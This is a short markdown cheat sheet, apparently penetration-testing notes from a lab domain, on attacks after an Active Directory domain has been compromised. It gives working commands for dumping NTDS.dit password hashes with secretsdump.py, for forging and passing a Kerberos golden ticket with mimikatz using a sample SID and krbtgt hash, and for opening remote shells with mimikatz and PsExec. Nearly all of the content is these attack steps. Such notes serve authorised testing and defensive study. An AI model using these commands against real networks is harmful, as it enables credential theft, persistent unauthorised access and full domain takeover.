
* **Post-Domain Compromise Attack Strategy**: Plan strategies post-domain compromise.
	- Plan strategies post-domain compromise.
* **Dumping the NTDS.dit**: Extract NTDS.dit for password hashes.
	- Extract NTDS.dit for password hashes.
		```bash
		secretsdump.py -just-dc-ntlm domain/administrator@192.168.1.1
		```
* **Golden Ticket Attacks**: Exploit Golden Ticket attacks.
	- Exploit Golden Ticket attacks by obtaining the NTLM hash and the domain SID using mimikatz. 
	- Generate a golden ticket and utilize the **Pass-the-Ticket** attack to gain access to any resource or system on the domain.
		```powershell
		mimikatz # kerberos::golden /User:secfortress /domain:marvel.local /sid:S-1-5-21-4089637540-2738901061-2314813381 /krbtgt:f362ad348de4e7392c0309959ec0775d /id:500 /ptt
		```
* **Executing Commands Remotely**: Once the golden ticket is generated, execute commands remotely using mimikatz.
	- Execute commands remotely to maintain access and control over the compromised domain.
		```powershell
		mimikatz # misc::cmd
		```
* **Using PsExec.exe for Remote Shell**: Gain a shell on remote targets using PsExec.exe.
	- Use PsExec.exe to establish a remote shell on target machines, enabling further exploitation and control.
		```powershell
		C:\Users\Administrator\Downloads>PsExec.exe \\THEPUNISHER cmd.exe
		```